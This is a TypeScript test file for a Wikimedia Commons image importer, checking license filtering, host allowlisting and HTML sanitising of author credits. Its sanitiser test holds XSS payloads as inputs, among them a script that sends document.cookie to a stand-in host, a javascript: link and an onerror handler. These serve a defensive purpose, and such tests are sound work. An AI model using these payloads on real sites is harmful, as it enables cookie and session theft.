import { describe, expect, it } from "vitest";
import {
  classifyLicense,
  cleanAuthor,
  downloadUrl,
  commonsFileTitle,
  downloadCommonsFile,
  fetchCommonsFile,
  htmlToText,
  parseCommonsResponse,
  parseImportLines,
} from "./commons";
import type { Transport } from "./safe-fetch";

describe("commonsFileTitle", () => {
  it("legge il titolo dalla pagina del file", () => {
    expect(commonsFileTitle("https://commons.wikimedia.org/wiki/File:Ortigia_Siracusa.jpg")).toBe("File:Ortigia Siracusa.jpg");
    expect(commonsFileTitle("https://commons.m.wikimedia.org/wiki/File:Noto%20Cattedrale.JPG")).toBe("File:Noto Cattedrale.JPG");
    expect(commonsFileTitle("https://commons.wikimedia.org/w/index.php?title=File:Etna.jpg&oldid=1")).toBe("File:Etna.jpg");
  });
  it("rifiuta pagine non di file e host diversi", () => {
    expect(commonsFileTitle("https://commons.wikimedia.org/wiki/Category:Sicily")).toBeNull();
    expect(commonsFileTitle("https://en.wikipedia.org/wiki/File:Etna.jpg")).toBeNull();
    expect(commonsFileTitle("http://commons.wikimedia.org/wiki/File:Etna.jpg")).toBeNull();
    expect(commonsFileTitle("https://upload.wikimedia.org/wikipedia/commons/a/ab/Etna.jpg")).toBeNull();
    expect(commonsFileTitle("https://commons.wikimedia.org.evil.it/wiki/File:Etna.jpg")).toBeNull();
    expect(commonsFileTitle("javascript:alert(1)")).toBeNull();
  });
});

describe("classifyLicense", () => {
  it("accetta CC0, CC BY e pubblico dominio", () => {
    expect(classifyLicense({ license: "cc0", shortName: "CC0" })).toMatchObject({ ok: true, license: "CC0 1.0" });
    expect(classifyLicense({ license: "cc-by-4.0", shortName: "CC BY 4.0", url: "https://creativecommons.org/licenses/by/4.0" })).toEqual({
      ok: true,
      license: "CC BY 4.0",
      licenseUrl: "https://creativecommons.org/licenses/by/4.0",
    });
    expect(classifyLicense({ license: "cc-by-3.0-it", shortName: "" })).toMatchObject({ ok: true, license: "CC BY 3.0" });
    expect(classifyLicense({ license: "pd", shortName: "Public domain" })).toMatchObject({ ok: true, license: "Pubblico dominio" });
  });
  it("CC BY-SA solo se l'admin la ammette; NC e ND mai", () => {
    expect(classifyLicense({ license: "cc-by-sa-4.0", shortName: "CC BY-SA 4.0" }, { allowSa: true })).toEqual({
      ok: true,
      license: "CC BY-SA 4.0",
      licenseUrl: "https://creativecommons.org/licenses/by-sa/4.0/",
    });
    expect(classifyLicense({ license: "cc-by-sa-3.0-it" }, { allowSa: true })).toMatchObject({ ok: true, license: "CC BY-SA 3.0" });
    expect(classifyLicense({ license: "cc-by-nc-sa-4.0" }, { allowSa: true })).toEqual({ ok: false, error: "license_nc" });
    expect(classifyLicense({ license: "cc-by-nd-4.0" }, { allowSa: true })).toEqual({ ok: false, error: "license_nd" });
  });

  it("rifiuta SA, NC, ND, licenze assenti e altre licenze", () => {
    expect(classifyLicense({ license: "cc-by-sa-4.0", shortName: "CC BY-SA 4.0" })).toEqual({ ok: false, error: "license_sa" });
    expect(classifyLicense({ license: "", shortName: "CC BY-SA 3.0" })).toEqual({ ok: false, error: "license_sa" });
    expect(classifyLicense({ license: "cc-by-nc-2.0", shortName: "CC BY-NC 2.0" })).toEqual({ ok: false, error: "license_nc" });
    expect(classifyLicense({ license: "cc-by-nc-sa-4.0" })).toEqual({ ok: false, error: "license_nc" });
    expect(classifyLicense({ license: "cc-by-nd-4.0" })).toEqual({ ok: false, error: "license_nd" });
    expect(classifyLicense({ license: null, shortName: null })).toEqual({ ok: false, error: "license_missing" });
    expect(classifyLicense({ license: "gfdl", shortName: "GFDL" })).toEqual({ ok: false, error: "license_not_allowed" });
  });
});

describe("pulizia dell'HTML", () => {
  it("autore: solo testo e un link http(s)", () => {
    expect(
      cleanAuthor('<a href="//commons.wikimedia.org/wiki/User:Mario_Rossi" title="User:Mario Rossi">Mario Rossi</a>'),
    ).toEqual({ author: "Mario Rossi", authorUrl: "https://commons.wikimedia.org/wiki/User:Mario_Rossi" });
    expect(cleanAuthor('<span class="fn">Anna &amp; Luca</span>')).toEqual({ author: "Anna & Luca", authorUrl: null });
  });
  it("autore malevolo: niente script, gestori, javascript: né tag", () => {
    const evil = cleanAuthor(
      '<a href="javascript:alert(1)" onclick="steal()">Mario<script>document.location="https://x.it/"+document.cookie</script></a>' +
        '<img src=x onerror=alert(1)><a href="data:text/html,<b>x</b>">y</a><a href=\'https://autore.it/\'>sito</a>',
    );
    expect(evil.author).toBe("Mario y sito");
    expect(evil.authorUrl).toBe("https://autore.it/");
    expect(evil.author).not.toMatch(/[<>]|script|onerror|javascript/i);

    const encoded = cleanAuthor("&lt;script&gt;alert(1)&lt;/script&gt;<b>Nome</b>‮\u0000");
    expect(encoded.author).toBe("<script>alert(1)</script> Nome");
    expect(encoded.authorUrl).toBeNull();
  });
  it("tag troncati e commenti spariscono; testi lunghi si accorciano", () => {
    expect(htmlToText("Nome <!-- nota --> <a href='x'")).toBe("Nome");
    expect(htmlToText("x".repeat(400), 50)).toHaveLength(50);
  });
});

const apiResponse = (meta: Record<string, string>, info: Record<string, unknown> = {}) => ({
  query: {
    pages: [
      {
        title: "File:Etna.jpg",
        imageinfo: [
          {
            width: 4000,
            height: 3000,
            mime: "image/jpeg",
            url: "https://upload.wikimedia.org/wikipedia/commons/a/ab/Etna.jpg",
            thumburl: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Etna.jpg/2560px-Etna.jpg",
            descriptionurl: "https://commons.wikimedia.org/wiki/File:Etna.jpg",
            extmetadata: Object.fromEntries(Object.entries(meta).map(([k, value]) => [k, { value }])),
            ...info,
          },
        ],
      },
    ],
  },
});

describe("parseCommonsResponse", () => {
  const meta = {
    Artist: '<a href="https://commons.wikimedia.org/wiki/User:Fotografo">Fotografo</a>',
    License: "cc-by-4.0",
    LicenseShortName: "CC BY 4.0",
    LicenseUrl: "https://creativecommons.org/licenses/by/4.0",
    ImageDescription: "<p>Il cratere <b>sud-est</b> dell'Etna</p>",
  };

  it("estrae autore, licenza, descrizione e URL di download", () => {
    const parsed = parseCommonsResponse(apiResponse(meta));
    expect(parsed).toEqual({
      ok: true,
      file: expect.objectContaining({
        author: "Fotografo",
        authorUrl: "https://commons.wikimedia.org/wiki/User:Fotografo",
        license: "CC BY 4.0",
        description: "Il cratere sud-est dell'Etna",
        downloadUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Etna.jpg/2560px-Etna.jpg",
        pageUrl: "https://commons.wikimedia.org/wiki/File:Etna.jpg",
      }),
    });
  });
  it("rifiuta licenza SA o NC, file piccoli e download fuori allowlist", () => {
    expect(parseCommonsResponse(apiResponse({ ...meta, License: "cc-by-sa-4.0", LicenseShortName: "CC BY-SA 4.0" }))).toMatchObject({
      ok: false,
      error: "license_sa",
    });
    expect(parseCommonsResponse(apiResponse({ ...meta, License: "cc-by-nc-4.0", LicenseShortName: "CC BY-NC 4.0" }))).toMatchObject({
      ok: false,
      error: "license_nc",
    });
    expect(parseCommonsResponse(apiResponse({ Artist: "x" }))).toMatchObject({ ok: false, error: "license_missing" });
    expect(parseCommonsResponse(apiResponse(meta, { width: 1200, height: 900 }))).toEqual({ ok: false, error: "too_small" });
    expect(parseCommonsResponse(apiResponse(meta, { thumburl: "https://evil.example/x.jpg", url: "https://evil.example/y.jpg" }))).toEqual({
      ok: false,
      error: "fetch_host_not_allowed",
      detail: "fetch_host_not_allowed: evil.example",
    });
    expect(parseCommonsResponse({ query: { pages: [{ title: "File:X.jpg", missing: true }] } })).toEqual({
      ok: false,
      error: "file_not_found",
    });
  });
});

describe("downloadUrl", () => {
  const orig = "https://upload.wikimedia.org/wikipedia/commons/a/ab/Teatro_greco.jpg";
  it("usa la miniatura dell'API se è su upload.wikimedia.org", () => {
    expect(downloadUrl("https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Teatro_greco.jpg/1920px-Teatro_greco.jpg", orig, 5000)).toBe(
      "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Teatro_greco.jpg/1920px-Teatro_greco.jpg",
    );
    expect(downloadUrl("//upload.wikimedia.org/wikipedia/commons/thumb/a/ab/T.jpg/1920px-T.jpg", orig, 5000)).toBe(
      "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/T.jpg/1920px-T.jpg",
    );
  });
  it("altrimenti la costruisce dall'originale, o usa l'originale se è già piccolo", () => {
    expect(downloadUrl("https://altro.example/x.jpg", orig, 5000)).toBe(
      "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Teatro_greco.jpg/1920px-Teatro_greco.jpg",
    );
    expect(downloadUrl(undefined, "https://upload.wikimedia.org/wikipedia/commons/c/cd/Scan.tif", 5000)).toBe(
      "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Scan.tif/1920px-Scan.tif.jpg",
    );
    expect(downloadUrl(undefined, orig, 1800)).toBe(orig);
  });
});

describe("rete (trasporto finto)", () => {
  const json = (body: unknown): Transport => async () => ({
    status: 200,
    header: (name) => (name === "content-type" ? "application/json; charset=utf-8" : null),
    body: (async function* () {
      yield new TextEncoder().encode(JSON.stringify(body));
    })(),
    cancel: () => {},
  });

  it("legge i metadati solo da commons.wikimedia.org", async () => {
    const result = await fetchCommonsFile(
      "https://commons.wikimedia.org/wiki/File:Etna.jpg",
      json(apiResponse({ License: "cc0", LicenseShortName: "CC0", Artist: "Anna" })),
    );
    expect(result).toMatchObject({ ok: true, file: { license: "CC0 1.0", author: "Anna" } });
    expect(await fetchCommonsFile("https://esempio.it/wiki/File:Etna.jpg", json({}))).toEqual({ ok: false, error: "invalid_page_url" });
  });

  it("scarica solo da upload.wikimedia.org", async () => {
    const never: Transport = async () => {
      throw new Error("nessuna richiesta attesa");
    };
    expect(await downloadCommonsFile("https://commons.wikimedia.org/x.jpg", never)).toMatchObject({ ok: false, error: "fetch_host_not_allowed" });
    expect(await downloadCommonsFile("https://10.0.0.1/x.jpg", never)).toMatchObject({ ok: false, error: "fetch_host_not_allowed" });
  });
});

describe("parseImportLines", () => {
  it("una riga per slug;URL, anche con tabulazione; righe non valide segnalate", () => {
    expect(
      parseImportLines("ortigia;https://commons.wikimedia.org/wiki/File:A.jpg\n\nnoto\thttps://commons.wikimedia.org/wiki/File:B.jpg\nsolo testo"),
    ).toEqual([
      { line: 1, slug: "ortigia", url: "https://commons.wikimedia.org/wiki/File:A.jpg" },
      { line: 3, slug: "noto", url: "https://commons.wikimedia.org/wiki/File:B.jpg" },
      { line: 4, slug: null, url: null },
    ]);
  });
});
